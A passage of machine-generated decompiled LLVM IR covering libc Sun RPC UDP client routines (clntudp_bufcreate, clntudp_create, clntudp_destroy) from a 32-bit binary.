  store i32 0, i32* %v2_805577b, align 4
  br label %dec_label_pc_8055810

dec_label_pc_8055787:                             ; preds = %entry
  %v2_8055787 = load i32, i32* %arg3, align 4
  store i32 %v2_8055787, i32* %edx.global-to-local, align 4
  %v1_8055789 = add i32 %tmp7, 4
  %v2_8055789 = inttoptr i32 %v1_8055789 to i32*
  %v3_8055789 = load i32, i32* %v2_8055789, align 4
  store i32 %v3_8055789, i32* %eax.global-to-local, align 4
  %v2_805578c = add i32 %v3_8055754, 36
  %v3_805578c = inttoptr i32 %v2_805578c to i32*
  store i32 %v2_8055787, i32* %v3_805578c, align 4
  %v0_805578f = load i32, i32* %eax.global-to-local, align 4
  %v1_805578f = load i32, i32* %ecx.global-to-local, align 4
  %v2_805578f = add i32 %v1_805578f, 40
  %v3_805578f = inttoptr i32 %v2_805578f to i32*
  store i32 %v0_805578f, i32* %v3_805578f, align 4
  br label %dec_label_pc_8055810

dec_label_pc_8055794:                             ; preds = %entry
  %v1_8055794 = add i32 %v3_8055754, 36
  %v2_8055794 = inttoptr i32 %v1_8055794 to i32*
  %v3_8055794 = load i32, i32* %v2_8055794, align 4
  store i32 %v3_8055794, i32* %edx.global-to-local, align 4
  %v1_8055797 = add i32 %v3_8055754, 40
  br label %dec_label_pc_80557af

dec_label_pc_805579c:                             ; preds = %entry
  %v2_805579c = load i32, i32* %arg3, align 4
  store i32 %v2_805579c, i32* %edx.global-to-local, align 4
  %v1_805579e = add i32 %tmp7, 4
  %v2_805579e = inttoptr i32 %v1_805579e to i32*
  %v3_805579e = load i32, i32* %v2_805579e, align 4
  store i32 %v3_805579e, i32* %eax.global-to-local, align 4
  %v2_80557a1 = add i32 %v3_8055754, 28
  %v3_80557a1 = inttoptr i32 %v2_80557a1 to i32*
  store i32 %v2_805579c, i32* %v3_80557a1, align 4
  %v0_80557a4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80557a4 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80557a4 = add i32 %v1_80557a4, 32
  %v3_80557a4 = inttoptr i32 %v2_80557a4 to i32*
  store i32 %v0_80557a4, i32* %v3_80557a4, align 4
  br label %dec_label_pc_8055810

dec_label_pc_80557a9:                             ; preds = %entry
  %v1_80557a9 = add i32 %v3_8055754, 28
  %v2_80557a9 = inttoptr i32 %v1_80557a9 to i32*
  %v3_80557a9 = load i32, i32* %v2_80557a9, align 4
  store i32 %v3_80557a9, i32* %edx.global-to-local, align 4
  %v1_80557ac = add i32 %v3_8055754, 32
  br label %dec_label_pc_80557af

dec_label_pc_80557af:                             ; preds = %dec_label_pc_8055794, %dec_label_pc_80557a9
  %storemerge.in.in = phi i32 [ %v1_80557ac, %dec_label_pc_80557a9 ], [ %v1_8055797, %dec_label_pc_8055794 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_80557af = add i32 %tmp7, 4
  %v3_80557af = inttoptr i32 %v2_80557af to i32*
  store i32 %storemerge, i32* %v3_80557af, align 4
  %v0_80557b2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80557b2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80557b2 = inttoptr i32 %v1_80557b2 to i32*
  store i32 %v0_80557b2, i32* %v2_80557b2, align 4
  br label %dec_label_pc_8055810

dec_label_pc_80557b6:                             ; preds = %entry
  %v1_80557b9 = add i32 %v3_8055754, 8
  store i32 %v1_80557b9, i32* %eax.global-to-local, align 4
  %v3_80557be = bitcast i32* %arg3 to i16*
  %v4_80557be = call i32 @memcpy(i16* %v3_80557be, i32 %v1_80557b9, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055815

dec_label_pc_80557cd:                             ; preds = %entry
  %v1_80557cd = inttoptr i32 %v3_8055754 to i32*
  %v2_80557cd = load i32, i32* %v1_80557cd, align 4
  store i32 %v2_80557cd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055802

dec_label_pc_80557d1:                             ; preds = %entry
  %v1_80557d1 = add i32 %v3_8055754, 88
  %v2_80557d1 = inttoptr i32 %v1_80557d1 to i32*
  %v3_80557d1 = load i32, i32* %v2_80557d1, align 4
  store i32 %v3_80557d1, i32* %eax.global-to-local, align 4
  %v1_80557d4 = inttoptr i32 %v3_80557d1 to i32*
  %v2_80557d4 = load i32, i32* %v1_80557d4, align 4
  %v1_80557d6 = call i32 @llvm.bswap.i32(i32 %v2_80557d4)
  store i32 %v1_80557d6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055802

dec_label_pc_80557da:                             ; preds = %entry
  %v2_80557da = load i32, i32* %arg3, align 4
  store i32 %v2_80557da, i32* %eax.global-to-local, align 4
  %v1_80557dc = add i32 %v3_8055754, 88
  %v2_80557dc = inttoptr i32 %v1_80557dc to i32*
  %v3_80557dc = load i32, i32* %v2_80557dc, align 4
  store i32 %v3_80557dc, i32* %edx.global-to-local, align 4
  %v1_80557df = add i32 %v2_80557da, -1
  %v1_80557e0 = call i32 @llvm.bswap.i32(i32 %v1_80557df)
  store i32 %v1_80557e0, i32* %eax.global-to-local, align 4
  %v2_80557e2 = inttoptr i32 %v3_80557dc to i32*
  store i32 %v1_80557e0, i32* %v2_80557e2, align 4
  %v0_80557e4.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055802.pre.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80557e4

dec_label_pc_80557e4:                             ; preds = %entry, %dec_label_pc_80557da
  %v1_8055802.pre = phi i32 [ %tmp7, %entry ], [ %v1_8055802.pre.pre, %dec_label_pc_80557da ]
  %v0_80557e4 = phi i32 [ %v3_8055754, %entry ], [ %v0_80557e4.pre, %dec_label_pc_80557da ]
  %v1_80557e4 = add i32 %v0_80557e4, 88
  %v2_80557e4 = inttoptr i32 %v1_80557e4 to i32*
  %v3_80557e4 = load i32, i32* %v2_80557e4, align 4
  store i32 %v3_80557e4, i32* %eax.global-to-local, align 4
  %v1_80557e7 = add i32 %v3_80557e4, 16
  %v2_80557e7 = inttoptr i32 %v1_80557e7 to i32*
  %v3_80557e7 = load i32, i32* %v2_80557e7, align 4
  %v1_80557ea = call i32 @llvm.bswap.i32(i32 %v3_80557e7)
  store i32 %v1_80557ea, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055802

dec_label_pc_80557ee:                             ; preds = %entry
  %v1_80557ee = add i32 %v3_8055754, 88
  %v2_80557ee = inttoptr i32 %v1_80557ee to i32*
  %v3_80557ee = load i32, i32* %v2_80557ee, align 4
  store i32 %v3_80557ee, i32* %edx.global-to-local, align 4
  %v2_80557f1 = load i32, i32* %arg3, align 4
  %v1_80557f3 = call i32 @llvm.bswap.i32(i32 %v2_80557f1)
  store i32 %v1_80557f3, i32* %eax.global-to-local, align 4
  %v2_80557f5 = add i32 %v3_80557ee, 16
  %v3_80557f5 = inttoptr i32 %v2_80557f5 to i32*
  store i32 %v1_80557f3, i32* %v3_80557f5, align 4
  br label %dec_label_pc_8055810

dec_label_pc_80557fa:                             ; preds = %entry
  %v1_80557fa = add i32 %v3_8055754, 88
  %v2_80557fa = inttoptr i32 %v1_80557fa to i32*
  %v3_80557fa = load i32, i32* %v2_80557fa, align 4
  store i32 %v3_80557fa, i32* %eax.global-to-local, align 4
  %v1_80557fd = add i32 %v3_80557fa, 12
  %v2_80557fd = inttoptr i32 %v1_80557fd to i32*
  %v3_80557fd = load i32, i32* %v2_80557fd, align 4
  %v1_8055800 = call i32 @llvm.bswap.i32(i32 %v3_80557fd)
  store i32 %v1_8055800, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055802

dec_label_pc_8055802:                             ; preds = %dec_label_pc_80557e4, %dec_label_pc_80557d1, %dec_label_pc_80557cd, %dec_label_pc_80557fa
  %v1_8055802 = phi i32 [ %v1_8055802.pre, %dec_label_pc_80557e4 ], [ %tmp7, %dec_label_pc_80557d1 ], [ %tmp7, %dec_label_pc_80557cd ], [ %tmp7, %dec_label_pc_80557fa ]
  %v0_8055802 = phi i32 [ %v1_80557ea, %dec_label_pc_80557e4 ], [ %v1_80557d6, %dec_label_pc_80557d1 ], [ %v2_80557cd, %dec_label_pc_80557cd ], [ %v1_8055800, %dec_label_pc_80557fa ]
  %v2_8055802 = inttoptr i32 %v1_8055802 to i32*
  store i32 %v0_8055802, i32* %v2_8055802, align 4
  br label %dec_label_pc_8055810

dec_label_pc_8055806:                             ; preds = %entry
  %v1_8055806 = add i32 %v3_8055754, 88
  %v2_8055806 = inttoptr i32 %v1_8055806 to i32*
  %v3_8055806 = load i32, i32* %v2_8055806, align 4
  store i32 %v3_8055806, i32* %edx.global-to-local, align 4
  %v2_8055809 = load i32, i32* %arg3, align 4
  %v1_805580b = call i32 @llvm.bswap.i32(i32 %v2_8055809)
  store i32 %v1_805580b, i32* %eax.global-to-local, align 4
  %v2_805580d = add i32 %v3_8055806, 12
  %v3_805580d = inttoptr i32 %v2_805580d to i32*
  store i32 %v1_805580b, i32* %v3_805580d, align 4
  br label %dec_label_pc_8055810

dec_label_pc_8055810:                             ; preds = %dec_label_pc_80557ee, %dec_label_pc_8055802, %dec_label_pc_805579c, %dec_label_pc_80557af, %dec_label_pc_8055787, %dec_label_pc_805577b, %dec_label_pc_805576f, %dec_label_pc_8055806
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055815

dec_label_pc_8055815:                             ; preds = %dec_label_pc_80557b6, %dec_label_pc_8055768, %dec_label_pc_8055810
  %v0_8055818 = phi i32 [ 1, %dec_label_pc_80557b6 ], [ 0, %dec_label_pc_8055768 ], [ 1, %dec_label_pc_8055810 ]
  %v2_8055815 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055815, i32* %edx.global-to-local, align 4
  ret i32 %v0_8055818

; uselistorder directives
  uselistorder i32 %v3_8055754, { 15, 14, 13, 11, 12, 10, 7, 3, 6, 5, 4, 2, 1, 0, 9, 8, 16 }
  uselistorder i32 %tmp7, { 4, 5, 6, 0, 2, 3, 1, 7 }
  uselistorder i32* %edx.global-to-local, { 8, 0, 1, 2, 5, 3, 4, 6, 7 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 18, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 13, 12, 9, 14, 15, 16, 17, 19, 20, 21 }
  uselistorder i32* %arg3, { 5, 4, 3, 1, 2, 0, 6 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055815, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055810, { 7, 1, 0, 3, 2, 4, 5, 6 }
  uselistorder label %dec_label_pc_8055802, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80557e4, { 1, 0 }
  uselistorder label %dec_label_pc_80557af, { 1, 0 }
}

define i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg5 to i32
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805581a = load i32, i32* @edi, align 4
  %v0_805581b = load i32, i32* @esi, align 4
  %v0_805581c = load i32, i32* @ebx, align 4
  store i32 %v0_805581c, i32* %stack_var_-16, align 4
  %v2_8055822 = call i32 @malloc(i32 12)
  %v1_8055835 = add i32 %arg6, 3
  %v1_8055838 = add i32 %arg7, 3
  %v1_805583b = and i32 %v1_8055835, -4
  store i32 %v1_805583b, i32* @edi, align 4
  %v1_805583e = and i32 %v1_8055838, -4
  store i32 %v1_805583e, i32* @ebx, align 4
  store i32 %v2_8055822, i32* @ebp, align 4
  %v2_8055843 = add i32 %v1_805583b, 100
  %v3_8055843 = add i32 %v2_8055843, %v1_805583e
  store i32 %v3_8055843, i32* %eax.global-to-local, align 4
  %v2_805584a = call i32 @malloc(i32 %v3_8055843)
  store i32 %v2_805584a, i32* %eax.global-to-local, align 4
  %v0_8055852 = load i32, i32* @ebp, align 4
  %v1_8055852 = icmp eq i32 %v0_8055852, 0
  store i32 %v2_805584a, i32* @esi, align 4
  br i1 %v1_8055852, label %dec_label_pc_805585c, label %dec_label_pc_8055858

dec_label_pc_8055858:                             ; preds = %entry
  %v1_8055858 = icmp eq i32 %v2_805584a, 0
  %v1_805585a = icmp eq i1 %v1_8055858, false
  br i1 %v1_805585a, label %dec_label_pc_805588a, label %dec_label_pc_805585c

dec_label_pc_805585c:                             ; preds = %entry, %dec_label_pc_8055858
  %v0_805585c = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_805585c, i32* %eax.global-to-local, align 4
  store i32 %v0_805585c, i32* @ebx, align 4
  %v0_8055865 = load i32, i32* inttoptr (i32 134622064 to i32*), align 16
  %v3_8055870 = call i32 @__GI_fputs(i32 ptrtoint ([31 x i8]* @global_var_805ce98.295 to i32), i32 %v0_8055865)
  store i32 %v3_8055870, i32* %eax.global-to-local, align 4
  %v0_8055878 = load i32, i32* @ebx, align 4
  %v1_8055878 = inttoptr i32 %v0_8055878 to i32*
  store i32 12, i32* %v1_8055878, align 4
  %v0_805587e = load i32, i32* @ebx, align 4
  %v1_805587e = add i32 %v0_805587e, 8
  %v2_805587e = inttoptr i32 %v1_805587e to i32*
  store i32 12, i32* %v2_805587e, align 4
  br label %dec_label_pc_8055a27

dec_label_pc_805588a:                             ; preds = %dec_label_pc_8055858
  %v1_805588a = load i32, i32* @ebx, align 4
  %v2_805588a = add i32 %v2_805584a, 96
  %v3_805588a = add i32 %v2_805588a, %v1_805588a
  %v2_805588e = add i32 %v2_805584a, 88
  %v3_805588e = inttoptr i32 %v2_805588e to i32*
  store i32 %v3_805588a, i32* %v3_805588e, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_8055895 = add i32 %arg1, 2
  %v2_8055895 = inttoptr i32 %v1_8055895 to i16*
  %v3_8055895 = load i16, i16* %v2_8055895, align 2
  %v4_8055895 = icmp eq i16 %v3_8055895, 0
  %v1_805589a = icmp eq i1 %v4_8055895, false
  br i1 %v1_805589a, label %dec_label_pc_80558c6, label %dec_label_pc_805589c

dec_label_pc_805589c:                             ; preds = %dec_label_pc_805588a
  %v5_80558a7 = call i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 17)
  %v1_80558af = urem i32 %v5_80558a7, 65536
  store i32 %v1_80558af, i32* %eax.global-to-local, align 4
  %v1_80558b2 = icmp eq i32 %v1_80558af, 0
  br i1 %v1_80558b2, label %dec_label_pc_8055a27, label %dec_label_pc_80558ba

dec_label_pc_80558ba:                             ; preds = %dec_label_pc_805589c
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_80558be = trunc i32 %v5_80558a7 to i16
  %v2_80558be = call i16 @llvm.bswap.i16(i16 %v1_80558be)
  %v3_80558be = zext i16 %v2_80558be to i32
  store i32 %v3_80558be, i32* %eax.global-to-local, align 4
  store i16 %v2_80558be, i16* %v2_8055895, align 2
  br label %dec_label_pc_80558c6

dec_label_pc_80558c6:                             ; preds = %dec_label_pc_805588a, %dec_label_pc_80558ba
  %v0_80558c6 = load i32, i32* @ebp, align 4
  %v1_80558c6 = add i32 %v0_80558c6, 4
  %v2_80558c6 = inttoptr i32 %v1_80558c6 to i32*
  store i32 ptrtoint (i32* @global_var_8062dcc.296 to i32), i32* %v2_80558c6, align 4
  %v1_80558cd = add i32 %v2_805584a, 8
  store i32 %v1_80558cd, i32* %eax.global-to-local, align 4
  %v1_80558d0 = load i32, i32* @ebp, align 4
  %v2_80558d0 = add i32 %v1_80558d0, 8
  %v3_80558d0 = inttoptr i32 %v2_80558d0 to i32*
  store i32 %v2_805584a, i32* %v3_80558d0, align 4
  %v0_80558da = load i32, i32* %eax.global-to-local, align 4
  %tmp36 = inttoptr i32 %v0_80558da to i16*
  %v5_80558db = call i32 @memcpy(i16* %tmp36, i32 %arg1, i32 16)
  store i32 %arg4, i32* %edx.global-to-local, align 4
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v0_80558eb = load i32, i32* @ebx, align 4
  %v2_80558eb = add i32 %v2_805584a, 92
  %v3_80558eb = inttoptr i32 %v2_80558eb to i32*
  store i32 %v0_80558eb, i32* %v3_80558eb, align 4
  %v1_80558ee = add i32 %v2_805584a, 56
  store i32 %v1_80558ee, i32* @ebx, align 4
  %v1_80558f1 = add i32 %v2_805584a, 24
  %v2_80558f1 = inttoptr i32 %v1_80558f1 to i32*
  store i32 16, i32* %v2_80558f1, align 4
  %v0_80558f8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80558f8 = add i32 %v2_805584a, 28
  %v3_80558f8 = inttoptr i32 %v2_80558f8 to i32*
  store i32 %v0_80558f8, i32* %v3_80558f8, align 4
  %v0_80558fb = load i32, i32* %eax.global-to-local, align 4
  %v2_80558fb = add i32 %v2_805584a, 32
  %v3_80558fb = inttoptr i32 %v2_80558fb to i32*
  store i32 %v0_80558fb, i32* %v3_80558fb, align 4
  %v1_80558fe = add i32 %v2_805584a, 36
  %v2_80558fe = inttoptr i32 %v1_80558fe to i32*
  store i32 -1, i32* %v2_80558fe, align 4
  %v1_8055905 = add i32 %v2_805584a, 40
  %v2_8055905 = inttoptr i32 %v1_8055905 to i32*
  store i32 -1, i32* %v2_8055905, align 4
  %v0_805590c = load i32, i32* @edi, align 4
  %v2_805590c = add i32 %v2_805584a, 84
  %v3_805590c = inttoptr i32 %v2_805590c to i32*
  store i32 %v0_805590c, i32* %v3_805590c, align 4
  %v0_805590f = call i32 @_create_xid()
  store i32 %arg3, i32* %edx.global-to-local, align 4
  store i32 %v0_805590f, i32* %stack_var_-72, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-112, align 4
  %v0_805593a = load i32, i32* @edi, align 4
  %v3_805593b = load i32, i32* %v3_805588e, align 4
  %v0_805593e = load i32, i32* @ebx, align 4
  %v4_805593f = inttoptr i32 %v0_805593e to i32*
  %v5_805593f = call i32 @__GI_xdrmem_create(i32* %v4_805593f, i32 %v3_805593b, i32 %v0_805593a, i32 0)
  %v2_8055947 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8055947, i32* @eax, align 4
  %v0_805594c = load i32, i32* @ebx, align 4
  %tmp37 = inttoptr i32 %v0_805594c to i32*
  %v4_805594d = call i32 @__GI_xdr_callhdr(i32* %tmp37, i32 %v2_8055947)
  store i32 %v4_805594d, i32* %eax.global-to-local, align 4
  %v1_8055955 = icmp eq i32 %v4_805594d, 0
  br i1 %v1_8055955, label %dec_label_pc_8055a27, label %dec_label_pc_805595d

dec_label_pc_805595d:                             ; preds = %dec_label_pc_80558c6
  %v1_805595d = add i32 %v2_805584a, 60
  %v2_805595d = inttoptr i32 %v1_805595d to i32*
  %v3_805595d = load i32, i32* %v2_805595d, align 4
  store i32 %v3_805595d, i32* %eax.global-to-local, align 4
  store i32 134568295, i32* %stack_var_-112, align 4
  %v5_8055964 = add i32 %v3_805595d, 16
  %v6_8055964 = inttoptr i32 %v5_8055964 to i32*
  %v7_8055964 = load i32, i32* %v6_8055964, align 4
  call void @__pseudo_call(i32 %v7_8055964)
  %v0_805596a = load i32, i32* %eax.global-to-local, align 4
  %v2_805596a = add i32 %v2_805584a, 80
  %v3_805596a = inttoptr i32 %v2_805596a to i32*
  store i32 %v0_805596a, i32* %v3_805596a, align 4
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v2_8055971 = load i32, i32* %arg5, align 4
  %v4_8055971 = icmp slt i32 %v2_8055971, 0
  %v1_8055974 = icmp eq i1 %v4_8055971, false
  br i1 %v1_8055974, label %dec_label_pc_8055a0e, label %dec_label_pc_805597a

dec_label_pc_805597a:                             ; preds = %dec_label_pc_805595d
  store i32 1, i32* %stack_var_-24, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v4_8055989 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_8055989, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8055998 = icmp slt i32 %v4_8055989, 0
  store i32 %v4_8055989, i32* %arg5, align 4
  %v1_805599c = icmp eq i1 %v2_8055998, false
  br i1 %v1_805599c, label %dec_label_pc_80559b7, label %dec_label_pc_805599e

dec_label_pc_805599e:                             ; preds = %dec_label_pc_805597a
  %v0_805599e = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_805599e, i32* %eax.global-to-local, align 4
  %v1_80559a3 = inttoptr i32 %v0_805599e to i32*
  store i32 12, i32* %v1_80559a3, align 4
  store i32 %v0_805599e, i32* @ebx, align 4
  %v0_80559ab = load i32, i32* %stack_var_-112, align 4
  %v1_80559ab = call i32 @__errno_location(i32 %v0_80559ab)
  store i32 %v1_80559ab, i32* %eax.global-to-local, align 4
  %v1_80559b0 = inttoptr i32 %v1_80559ab to i32*
  %v2_80559b0 = load i32, i32* %v1_80559b0, align 4
  store i32 %v2_80559b0, i32* %eax.global-to-local, align 4
  %v1_80559b2 = load i32, i32* @ebx, align 4
  %v2_80559b2 = add i32 %v1_80559b2, 8
  %v3_80559b2 = inttoptr i32 %v2_80559b2 to i32*
  store i32 %v2_80559b0, i32* %v3_80559b2, align 4
  br label %dec_label_pc_8055a27

dec_label_pc_80559b7:                             ; preds = %dec_label_pc_805597a
  %v0_80559b7 = load i32, i32* @ecx, align 4
  store i32 %v4_8055989, i32* %stack_var_-112, align 4
  %v6_80559bc = call i32 @__GI_bindresvport(i32 %v4_8055989, i16* null, i32 %v0_80559b7, i32 %v0_80559b7)
  %v2_80559c1 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v2_80559d5 = load i32, i32* %arg5, align 4
  store i32 %v2_80559d5, i32* %stack_var_-112, align 4
  %v4_80559d7 = call i32 @ioctl(i32 %v2_80559d5, i32 21537, i32 %v2_80559c1)
  %v2_80559dc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80559dc, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  store i32 4, i32* %stack_var_-112, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_80559fb = load i32, i32* %arg5, align 4
  %v5_80559fd = call i32 @__GI_setsockopt(i32 %v2_80559fb, i32 0, i32 11, i32 %v2_80559dc, i32 4)
  store i32 %v5_80559fd, i32* %eax.global-to-local, align 4
  %v1_8055a05 = add i32 %v2_805584a, 4
  %v2_8055a05 = inttoptr i32 %v1_8055a05 to i32*
  store i32 1, i32* %v2_8055a05, align 4
  br label %dec_label_pc_8055a15

dec_label_pc_8055a0e:                             ; preds = %dec_label_pc_805595d
  %v1_8055a0e = add i32 %v2_805584a, 4
  %v2_8055a0e = inttoptr i32 %v1_8055a0e to i32*
  store i32 0, i32* %v2_8055a0e, align 4
  br label %dec_label_pc_8055a15

dec_label_pc_8055a15:                             ; preds = %dec_label_pc_80559b7, %dec_label_pc_8055a0e
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8055a19 = load i32, i32* %arg5, align 4
  store i32 %v2_8055a19, i32* %eax.global-to-local, align 4
  %v2_8055a1b = inttoptr i32 %v2_805584a to i32*
  store i32 %v2_8055a19, i32* %v2_8055a1b, align 4
  %v0_8055a1d = call i32 @authnone_create()
  store i32 %v0_8055a1d, i32* %eax.global-to-local, align 4
  %v1_8055a22 = load i32, i32* @ebp, align 4
  %v2_8055a22 = inttoptr i32 %v1_8055a22 to i32*
  store i32 %v0_8055a1d, i32* %v2_8055a22, align 4
  br label %dec_label_pc_8055a49

dec_label_pc_8055a27:                             ; preds = %dec_label_pc_80558c6, %dec_label_pc_805589c, %dec_label_pc_805599e, %dec_label_pc_805585c
  %v1_8055a27 = icmp eq i32 %v2_805584a, 0
  br i1 %v1_8055a27, label %dec_label_pc_8055a37, label %dec_label_pc_8055a2b

dec_label_pc_8055a2b:                             ; preds = %dec_label_pc_8055a27
  %v2_8055a2f = call i32 @free(i32 %v2_805584a)
  store i32 %v2_8055a2f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055a37

dec_label_pc_8055a37:                             ; preds = %dec_label_pc_8055a27, %dec_label_pc_8055a2b
  %v0_8055a37 = load i32, i32* @ebp, align 4
  %v1_8055a37 = icmp eq i32 %v0_8055a37, 0
  br i1 %v1_8055a37, label %dec_label_pc_8055a49, label %dec_label_pc_8055a3b

dec_label_pc_8055a3b:                             ; preds = %dec_label_pc_8055a37
  store i32 0, i32* @ebp, align 4
  %v2_8055a41 = call i32 @free(i32 %v0_8055a37)
  store i32 %v2_8055a41, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055a49

dec_label_pc_8055a49:                             ; preds = %dec_label_pc_8055a37, %dec_label_pc_8055a15, %dec_label_pc_8055a3b
  %v0_8055a4c = load i32, i32* @ebp, align 4
  store i32 %v0_8055a4c, i32* %eax.global-to-local, align 4
  %v2_8055a4f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055a4f, i32* @esi, align 4
  store i32 %v0_805581b, i32* @edi, align 4
  store i32 %v0_805581a, i32* @ebp, align 4
  ret i32 %v0_8055a4c

; uselistorder directives
  uselistorder i32 %v4_8055989, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_80558af, { 1, 0 }
  uselistorder i32 %v5_80558a7, { 1, 0 }
  uselistorder i32 %v2_805584a, { 9, 5, 1, 17, 6, 16, 12, 15, 14, 13, 11, 10, 3, 2, 4, 8, 7, 0, 18, 20, 19, 21 }
  uselistorder i32* %stack_var_-112, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp11, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 0, 3, 2, 1 }
  uselistorder i32* %arg5, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 4, 0, 3, 2 }
  uselistorder label %dec_label_pc_8055a49, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055a37, { 1, 0 }
  uselistorder label %dec_label_pc_8055a27, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8055a15, { 1, 0 }
  uselistorder label %dec_label_pc_80558c6, { 1, 0 }
  uselistorder label %dec_label_pc_805585c, { 1, 0 }
}

define i32 @__GI_clntudp_create(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v8_8055a78 = inttoptr i32 %arg5 to i32*
  %v9_8055a78 = call i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %v8_8055a78, i32 %arg6, i32 8800, i32 8800)
  ret i32 %v9_8055a78
}

define i32 @clntudp_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8055a81 = load i32, i32* @esi, align 4
  %v0_8055a82 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8055a8a = add i32 %arg1, 8
  %v2_8055a8a = inttoptr i32 %v1_8055a8a to i32*
  %v3_8055a8a = load i32, i32* %v2_8055a8a, align 4
  store i32 %v3_8055a8a, i32* @ebx, align 4
  %v1_8055a8d = add i32 %v3_8055a8a, 4
  %v2_8055a8d = inttoptr i32 %v1_8055a8d to i32*
  %v3_8055a8d = load i32, i32* %v2_8055a8d, align 4
  %v4_8055a8d = icmp eq i32 %v3_8055a8d, 0
  br i1 %v4_8055a8d, label %dec_label_pc_8055aa0, label %dec_label_pc_8055a93

dec_label_pc_8055a93:                             ; preds = %entry
  %v1_8055a96 = inttoptr i32 %v3_8055a8a to i32*
  %v2_8055a96 = load i32, i32* %v1_8055a96, align 4
  %v1_8055a98 = call i32 @__libc_close(i32 %v2_8055a96)
  %v0_8055aa0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055aa0

dec_label_pc_8055aa0:                             ; preds = %entry, %dec_label_pc_8055a93
  %v0_8055aad = phi i32 [ %v3_8055a8a, %entry ], [ %v0_8055aa0.pre, %dec_label_pc_8055a93 ]
  %v1_8055aa0 = add i32 %v0_8055aad, 60
  %v2_8055aa0 = inttoptr i32 %v1_8055aa0 to i32*
  %v3_8055aa0 = load i32, i32* %v2_8055aa0, align 4
  %v1_8055aa3 = add i32 %v3_8055aa0, 28
  %v2_8055aa3 = inttoptr i32 %v1_8055aa3 to i32*
  %v3_8055aa3 = load i32, i32* %v2_8055aa3, align 4
  %v1_8055aa6 = icmp eq i32 %v3_8055aa3, 0
  br i1 %v1_8055aa6, label %dec_label_pc_8055ab6, label %dec_label_pc_8055aaa

dec_label_pc_8055aaa:                             ; preds = %dec_label_pc_8055aa0
  call void @__pseudo_call(i32 %v3_8055aa3)
  %v0_8055ab9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055ab6

dec_label_pc_8055ab6:                             ; preds = %dec_label_pc_8055aa0, %dec_label_pc_8055aaa
